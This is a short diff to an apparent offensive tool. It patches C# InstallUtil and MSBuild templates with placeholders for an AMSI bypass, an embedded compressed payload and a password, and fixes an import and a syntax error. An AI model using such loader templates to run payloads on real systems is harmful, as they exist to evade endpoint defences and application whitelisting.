@@ -137,6 +137,7 @@ MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/devel
 ##########################
 INSTALLUTIL='''using System;
 using System.IO;
+using System.Text;
 using System.IO.Compression;
 using System.Diagnostics;
 using System.Reflection;
@@ -187,7 +188,7 @@ namespace Exec
 			Console.WriteLine("Started...");
             		__AMSI__
 			__PAYLOAD__
-			byte [] final = Decompress(Convert.FromBase64String(mydata))
+			byte [] final = Decompress(Convert.FromBase64String(mydata));
          	   	string pass="__PASSWORD__";
 			byte[] password=Encoding.ASCII.GetBytes(pass);
 			if (password.Length!=0)
